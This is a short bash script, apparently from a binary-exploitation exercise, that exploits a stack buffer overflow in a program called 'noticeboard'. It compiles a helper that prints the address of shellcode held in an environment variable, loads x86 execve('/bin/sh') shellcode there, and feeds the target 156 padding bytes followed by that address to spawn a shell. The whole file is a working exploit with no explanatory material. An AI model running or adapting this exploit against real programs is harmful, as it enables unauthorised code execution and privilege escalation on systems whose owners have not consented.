#! /bin/bash

#      noticeboard.c  <- it's important the names are the same length to
#                        preserve the memory offsets to environment variables.
cat - >getshelladr.c << EOF
#include <stdio.h>
#include <stdlib.h>

int main(void)
{	
	printf("%p\n", getenv("SHELLCODE"));
	return 0;
}
EOF
make getshelladr

SHELLCODE=$'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
export SHELLCODE

ADDR=$($PWD/getshelladr | sed -e 's/0x\(..\)\(..\)\(..\)\(..\)/\\x\4\\x\3\\x\2\\x\1/')
$PWD/noticeboard `perl -e "print 'A'x156, \"$ADDR\""`
